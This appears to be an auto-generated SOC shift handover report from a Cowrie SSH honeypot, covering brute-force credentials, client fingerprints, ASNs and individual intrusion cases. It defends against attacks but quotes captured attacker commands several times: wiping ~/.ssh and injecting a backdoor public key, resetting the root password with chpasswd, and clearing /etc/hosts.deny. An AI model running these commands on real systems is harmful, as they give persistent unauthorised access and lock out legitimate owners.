# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-26 |
| **Generated At** | 2026-04-26T09:06:46Z |
| **Shift Time** | 09:06 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **295** |
| Confirmed Threats | **217** |
| False Positives Filtered | **78** (26.4%) |
| Unique Attacker IPs | **37** |
| Countries of Origin | **17** |
| High Severity Cases | **74** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **221** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **209** |
| Unique Credential Pairs | **104** |
| Unique Usernames | **47** |
| Unique Passwords | **98** |
| Successful Auth Pairs | **42** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 76 |
| `345gs5662d34` | 33 |
| `ubuntu` | 9 |
| `steam` | 8 |
| `test` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 33 |
| `3245gs5662d34` | 33 |
| `` | 12 |
| `Host: 13.235.92.17:23` | 5 |
| `Accept: */*` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 33 |
| `root` | `3245gs5662d34` | 33 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 5 |
| `Accept-Encoding: gzip` | `` | 5 |
| `root` | `` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `!Q2w3e4r` | `101.36.107.152` | 2026-04-26T06:16:55 |
| `root` | `` | `103.138.124.41` | 2026-04-26T06:19:01 |
| `root` | `` | `31.56.209.39` | 2026-04-26T06:19:03 |
| `root` | `Qazwsx2022#` | `103.199.16.90` | 2026-04-26T06:20:15 |
| `root` | `3245gs5662d34` | `103.199.16.90` | 2026-04-26T06:20:18 |
| `root` | `ZZbb123123` | `103.199.16.90` | 2026-04-26T06:22:17 |
| `root` | `qazwsx111111` | `103.199.16.90` | 2026-04-26T06:23:18 |
| `root` | `Asdf1234!` | `103.199.16.90` | 2026-04-26T06:25:12 |
| `root` | `Root54321!@` | `103.199.16.90` | 2026-04-26T06:26:09 |
| `root` | `bbDD111` | `103.199.16.90` | 2026-04-26T06:27:07 |
| `root` | `123ABCabc` | `103.199.16.90` | 2026-04-26T06:29:03 |
| `root` | `Root9999#$` | `103.199.16.90` | 2026-04-26T06:30:04 |
| `root` | `Root09!` | `157.66.34.121` | 2026-04-26T06:30:31 |
| `root` | `3245gs5662d34` | `157.66.34.121` | 2026-04-26T06:30:34 |
| `root` | `Password!23` | `103.199.16.90` | 2026-04-26T06:31:08 |
| `root` | `Aa112211.` | `103.199.16.90` | 2026-04-26T06:32:04 |
| `root` | `li123456.` | `157.66.34.121` | 2026-04-26T06:32:26 |
| `root` | `qazwsx123123` | `103.199.16.90` | 2026-04-26T06:33:00 |
| `root` | `Love1314` | `157.66.34.121` | 2026-04-26T06:34:19 |
| `root` | `nPSpP4PBW0` | `103.199.16.90` | 2026-04-26T06:36:01 |
| `root` | `ZAQ!2wsx54321@` | `103.199.16.90` | 2026-04-26T06:37:12 |
| `root` | `123456as` | `103.199.16.90` | 2026-04-26T06:38:09 |
| `root` | `Test2024` | `103.199.16.90` | 2026-04-26T06:39:05 |
| `root` | `A` | `103.199.16.90` | 2026-04-26T06:40:03 |
| `root` | `k9jt3d` | `103.199.16.90` | 2026-04-26T06:41:06 |
| `root` | `123456abc.` | `157.66.34.121` | 2026-04-26T06:43:10 |
| `root` | `Wk123456` | `157.66.34.121` | 2026-04-26T06:44:08 |
| `root` | `Admin@888` | `157.66.34.121` | 2026-04-26T06:45:04 |
| `root` | `Password@12345` | `157.66.34.121` | 2026-04-26T06:49:57 |
| `root` | `Cc123456789` | `157.66.34.121` | 2026-04-26T06:50:53 |
| `root` | `ubuntu` | `120.48.122.43` | 2026-04-26T07:47:55 |
| `root` | `BBqq111` | `172.206.32.4` | 2026-04-26T08:41:18 |
| `root` | `3245gs5662d34` | `172.206.32.4` | 2026-04-26T08:41:23 |
| `root` | `aa@159357` | `103.101.197.221` | 2026-04-26T08:44:29 |
| `root` | `3245gs5662d34` | `103.101.197.221` | 2026-04-26T08:44:31 |
| `root` | `Qwerty111111` | `103.101.197.221` | 2026-04-26T08:49:52 |
| `root` | `Admin@2026` | `103.101.197.221` | 2026-04-26T08:51:13 |
| `root` | `root28!` | `114.220.238.30` | 2026-04-26T08:53:32 |
| `root` | `Ld123456` | `103.101.197.221` | 2026-04-26T08:53:52 |
| `root` | `BBqq111` | `103.101.197.221` | 2026-04-26T08:55:54 |
| `root` | `Apple2026` | `103.101.197.221` | 2026-04-26T08:58:36 |
| `root` | `Admin@2026` | `172.206.32.4` | 2026-04-26T09:05:28 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **295** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 189 |
| OpenSSH | 26 |
| Go SSH scanner | 16 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 143 | 4 |
| `03a80b21afa8...` | Modern SSH client | 46 | 2 |
| `c118de82e19e...` | Mirai/variant | 23 | 4 |
| `4e066189c3bb...` | Generic scanner | 6 | 2 |
| `0a07365cc01f...` | Generic scanner | 5 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 143 | 4 | libssh-based |
| `03a80b21afa8...` | libssh | 46 | 2 | Modern SSH client |
| `c118de82e19e...` | OpenSSH | 23 | 4 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 6 | 2 | Generic scanner |
| `0a07365cc01f...` | Go SSH scanner | 5 | 1 | Generic scanner |
| `95420f9d932d...` | OpenSSH | 3 | 2 | — |
| `084386fa7ae5...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `17a5327c6d98...` | Go SSH scanner | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 33 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:UfSrP4neqVw2"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `114.220.238.30`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `157.66.34.121`, `103.101.197.221`, `103.199.16.90`, `172.206.32.4`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **37** |
| Unique ASNs | **28** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 6 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 1 | HIGH |
| `AS202412` | Omegatech LTD | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (62)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b345837009fc

| Field | Detail |
|---|---|
| **Source IP** | `101.36.107[.]152` |
| **First Seen** | 2026-04-26 06:16 |
| **Last Seen** | 2026-04-26 06:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:16:55` | `cowrie.session.connect` |
| `2026-04-26 06:16:55` | `cowrie.client.version` |
| `2026-04-26 06:16:55` | `cowrie.client.kex` |
| `2026-04-26 06:16:55` | `cowrie.login.success` |
| `2026-04-26 06:16:56` | `cowrie.session.params` |
| `2026-04-26 06:16:56` | `cowrie.command.input` |
| `2026-04-26 06:16:56` | `cowrie.log.closed` |
| `2026-04-26 06:16:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.107[.]152` to AbuseIPDB if not already reported
- [ ] Block `101.36.107[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee223d26cc92

| Field | Detail |
|---|---|
| **Source IP** | `103.138.124[.]41` |
| **First Seen** | 2026-04-26 06:19 |
| **Last Seen** | 2026-04-26 06:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:19:01` | `cowrie.session.connect` |
| `2026-04-26 06:19:01` | `cowrie.client.version` |
| `2026-04-26 06:19:01` | `cowrie.client.kex` |
| `2026-04-26 06:19:01` | `cowrie.login.success` |
| `2026-04-26 06:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.138.124[.]41` to AbuseIPDB if not already reported
- [ ] Block `103.138.124[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41432a70590d

| Field | Detail |
|---|---|
| **Source IP** | `103.138.124[.]41` |
| **First Seen** | 2026-04-26 06:19 |
| **Last Seen** | 2026-04-26 06:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:19:01` | `cowrie.session.connect` |
| `2026-04-26 06:19:01` | `cowrie.client.version` |
| `2026-04-26 06:19:01` | `cowrie.client.kex` |
| `2026-04-26 06:19:02` | `cowrie.login.success` |
| `2026-04-26 06:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.138.124[.]41` to AbuseIPDB if not already reported
- [ ] Block `103.138.124[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7413f867250a

| Field | Detail |
|---|---|
| **Source IP** | `31.56.209[.]39` |
| **First Seen** | 2026-04-26 06:19 |
| **Last Seen** | 2026-04-26 06:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps" | sh, cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps
` |
| **TTPs (MITRE)** | T1057 · T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:19:02` | `cowrie.session.connect` |
| `2026-04-26 06:19:02` | `cowrie.client.version` |
| `2026-04-26 06:19:02` | `cowrie.client.kex` |
| `2026-04-26 06:19:03` | `cowrie.login.success` |
| `2026-04-26 06:19:03` | `cowrie.client.size` |
| `2026-04-26 06:19:03` | `cowrie.session.params` |
| `2026-04-26 06:19:03` | `cowrie.command.input` |
| `2026-04-26 06:19:03` | `cowrie.command.input` |
| `2026-04-26 06:19:03` | `cowrie.command.failed` |
| `2026-04-26 06:19:03` | `cowrie.command.input` |
| `2026-04-26 06:19:08` | `cowrie.log.closed` |
| `2026-04-26 06:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.209[.]39` to AbuseIPDB if not already reported
- [ ] Block `31.56.209[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d68747a84408

| Field | Detail |
|---|---|
| **Source IP** | `31.56.209[.]39` |
| **First Seen** | 2026-04-26 06:19 |
| **Last Seen** | 2026-04-26 06:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps" | sh, cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps
` |
| **TTPs (MITRE)** | T1057 · T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:19:02` | `cowrie.session.connect` |
| `2026-04-26 06:19:02` | `cowrie.client.version` |
| `2026-04-26 06:19:03` | `cowrie.client.kex` |
| `2026-04-26 06:19:03` | `cowrie.login.success` |
| `2026-04-26 06:19:04` | `cowrie.client.size` |
| `2026-04-26 06:19:04` | `cowrie.session.params` |
| `2026-04-26 06:19:04` | `cowrie.command.input` |
| `2026-04-26 06:19:04` | `cowrie.command.input` |
| `2026-04-26 06:19:04` | `cowrie.command.failed` |
| `2026-04-26 06:19:04` | `cowrie.command.input` |
| `2026-04-26 06:19:09` | `cowrie.log.closed` |
| `2026-04-26 06:19:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.209[.]39` to AbuseIPDB if not already reported
- [ ] Block `31.56.209[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7479a0fbbcb6

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:20 |
| **Last Seen** | 2026-04-26 06:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:20:14` | `cowrie.session.connect` |
| `2026-04-26 06:20:14` | `cowrie.client.version` |
| `2026-04-26 06:20:14` | `cowrie.client.kex` |
| `2026-04-26 06:20:15` | `cowrie.login.success` |
| `2026-04-26 06:20:15` | `cowrie.session.params` |
| `2026-04-26 06:20:15` | `cowrie.command.input` |
| `2026-04-26 06:20:15` | `cowrie.command.failed` |
| `2026-04-26 06:20:15` | `cowrie.log.closed` |
| `2026-04-26 06:20:16` | `cowrie.session.params` |
| `2026-04-26 06:20:16` | `cowrie.command.input` |
| `2026-04-26 06:20:16` | `cowrie.session.file_download` |
| `2026-04-26 06:20:16` | `cowrie.log.closed` |
| `2026-04-26 06:20:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dd255fdb4a5

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:20 |
| **Last Seen** | 2026-04-26 06:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:20:18` | `cowrie.session.connect` |
| `2026-04-26 06:20:18` | `cowrie.client.version` |
| `2026-04-26 06:20:18` | `cowrie.client.kex` |
| `2026-04-26 06:20:18` | `cowrie.login.success` |
| `2026-04-26 06:20:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-668359a8c196

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:22 |
| **Last Seen** | 2026-04-26 06:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:22:16` | `cowrie.session.connect` |
| `2026-04-26 06:22:16` | `cowrie.client.version` |
| `2026-04-26 06:22:16` | `cowrie.client.kex` |
| `2026-04-26 06:22:17` | `cowrie.login.success` |
| `2026-04-26 06:22:17` | `cowrie.session.params` |
| `2026-04-26 06:22:17` | `cowrie.command.input` |
| `2026-04-26 06:22:17` | `cowrie.command.failed` |
| `2026-04-26 06:22:17` | `cowrie.log.closed` |
| `2026-04-26 06:22:17` | `cowrie.session.params` |
| `2026-04-26 06:22:17` | `cowrie.command.input` |
| `2026-04-26 06:22:17` | `cowrie.session.file_download` |
| `2026-04-26 06:22:17` | `cowrie.log.closed` |
| `2026-04-26 06:22:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-724ef8f322d2

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:22 |
| **Last Seen** | 2026-04-26 06:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:22:19` | `cowrie.session.connect` |
| `2026-04-26 06:22:19` | `cowrie.client.version` |
| `2026-04-26 06:22:19` | `cowrie.client.kex` |
| `2026-04-26 06:22:20` | `cowrie.login.success` |
| `2026-04-26 06:22:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f064b7126732

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:23 |
| **Last Seen** | 2026-04-26 06:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:23:18` | `cowrie.session.connect` |
| `2026-04-26 06:23:18` | `cowrie.client.version` |
| `2026-04-26 06:23:18` | `cowrie.client.kex` |
| `2026-04-26 06:23:18` | `cowrie.login.success` |
| `2026-04-26 06:23:19` | `cowrie.session.params` |
| `2026-04-26 06:23:19` | `cowrie.command.input` |
| `2026-04-26 06:23:19` | `cowrie.command.failed` |
| `2026-04-26 06:23:19` | `cowrie.log.closed` |
| `2026-04-26 06:23:19` | `cowrie.session.params` |
| `2026-04-26 06:23:19` | `cowrie.command.input` |
| `2026-04-26 06:23:19` | `cowrie.session.file_download` |
| `2026-04-26 06:23:19` | `cowrie.log.closed` |
| `2026-04-26 06:23:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63e55b5bf130

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:23 |
| **Last Seen** | 2026-04-26 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:23:21` | `cowrie.session.connect` |
| `2026-04-26 06:23:21` | `cowrie.client.version` |
| `2026-04-26 06:23:21` | `cowrie.client.kex` |
| `2026-04-26 06:23:22` | `cowrie.login.success` |
| `2026-04-26 06:23:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4106ba20c16

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:25 |
| **Last Seen** | 2026-04-26 06:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:25:12` | `cowrie.session.connect` |
| `2026-04-26 06:25:12` | `cowrie.client.version` |
| `2026-04-26 06:25:12` | `cowrie.client.kex` |
| `2026-04-26 06:25:12` | `cowrie.login.success` |
| `2026-04-26 06:25:13` | `cowrie.session.params` |
| `2026-04-26 06:25:13` | `cowrie.command.input` |
| `2026-04-26 06:25:13` | `cowrie.command.failed` |
| `2026-04-26 06:25:13` | `cowrie.log.closed` |
| `2026-04-26 06:25:13` | `cowrie.session.params` |
| `2026-04-26 06:25:13` | `cowrie.command.input` |
| `2026-04-26 06:25:13` | `cowrie.session.file_download` |
| `2026-04-26 06:25:13` | `cowrie.log.closed` |
| `2026-04-26 06:25:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adcbd8b47e85

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
